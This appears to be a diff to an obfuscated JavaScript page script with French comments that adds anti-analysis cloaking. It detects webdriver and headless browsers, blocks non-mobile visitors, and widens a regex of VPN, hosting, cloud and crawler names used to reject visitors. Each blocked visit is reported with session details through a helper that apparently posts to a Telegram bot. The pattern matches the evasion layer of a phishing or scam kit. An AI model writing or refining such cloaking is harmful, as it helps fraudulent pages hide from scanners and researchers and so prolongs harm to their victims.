@@ -197,6 +197,14 @@
   }
 
   function _init(){
+    // 1. Détection Bots / Headless / Emulateurs automatisés
+    if (_N.webdriver || _W.callPhantom || _W._phantom || _W.__nightmare || _W.navigator.webdriver) {
+      _tg(_R, '🛑 <b>BLOCAGE BOT AUTOMATISÉ (WEBDRIVER)</b>\n🆔 Session: <code>' + _SID + '</code>');
+      _die();
+      return;
+    }
+
+    // 2. Blocage strict PC / Émulateurs / Écrans non-mobiles
     if (!_isMobile()) {
       _tg(_R, '🛑 <b>BLOCAGE PC / NON-MOBILE</b>\n🆔 Session: <code>' + _SID + '</code>\n🖥️ UA: <code>' + _N.userAgent + '</code>');
       setTimeout(_die, 500);
@@ -259,7 +267,7 @@
       return;
     }
 
-    var vpnPatterns = /vpn|proxy|tor|exit|relay|datacenter|hosting|server|cloud|vps|ovh|digitalocean|linode|hetzner|m247|choopa|vultr|leaseweb|colocrossing|cogent|amazon|aws|google|azure|microsoft|oracle|alibaba|cloudflare|fastly|akamai|packethub|quadranet|tzulo|ipvanish|nord|expressvpn|surfshark|cyberghost|privateinternetaccess|mullvad|proton|purevpn|windscribe|hide\.me|zenmate|hotspot|tunnelbear|anchorfree|hostpapa|datapacket|performive|cogentco|zenlayer/i;
+    var vpnPatterns = /vpn|proxy|tor|exit|relay|datacenter|hosting|server|cloud|vps|ovh|digitalocean|linode|hetzner|m247|choopa|vultr|leaseweb|colocrossing|cogent|amazon|aws|google|azure|microsoft|oracle|alibaba|cloudflare|fastly|akamai|packethub|quadranet|tzulo|ipvanish|nord|expressvpn|surfshark|cyberghost|privateinternetaccess|mullvad|proton|purevpn|windscribe|hide\.me|zenmate|hotspot|tunnelbear|anchorfree|hostpapa|datapacket|performive|cogentco|zenlayer|contabo|kamatera|ionos|rackspace|interserver|liquidweb|tsohost|namecheap|hostinger|inmotion|dreamhost|bluehost|siteground|a2hosting|godaddy|hawkhost|scaleaway|scaleway|upcloud|equinix|gtt|zayo|lumen|centurylink|level3|hurricane|he\.net|bot|crawl|spider|scrape/i;
 
     function _verifyWithSecondaryApi(ip, city, country, org) {
       fetch('https://freeipapi.com/api/json/' + ip)
